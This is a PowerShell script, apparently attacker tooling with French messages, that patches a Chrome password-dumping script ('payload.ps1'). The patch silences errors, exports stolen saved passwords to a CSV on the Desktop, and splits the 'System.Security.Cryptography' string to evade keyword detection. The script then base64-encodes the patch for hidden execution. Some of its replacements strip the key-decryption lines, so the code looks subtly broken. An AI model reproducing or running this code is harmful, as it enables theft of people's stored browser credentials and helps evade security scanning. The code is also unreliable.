$patch = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$c = Get-Content 'payload.ps1' -Raw
`$c = `$c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
`$c = `$c -replace '\`$arrExp \| Format-Table', ('`$arrExp | Export-Csv -Path "`$env:USERPROFILE\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
`$c = `$c -replace '#requires -version 7', ''
`$c = `$c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '0x00'
`$c = `$c -replace '(?m)^\s*\`$Script:GCMKey\s*=\s*\[AesGcm\]::new\([^)]*\).*`$', ''
`$c = `$c -replace '(?m)^\s*\`$masterKey\s*=\s*\[ProtectedData\]::Unprotect\([^)]*\).*`$', ''
`$c = `$c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
Set-Content 'run_chrome.ps1' -Value `$c
"@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($patch)
$b64 = [Convert]::ToBase64String($bytes)
Write-Output $b64
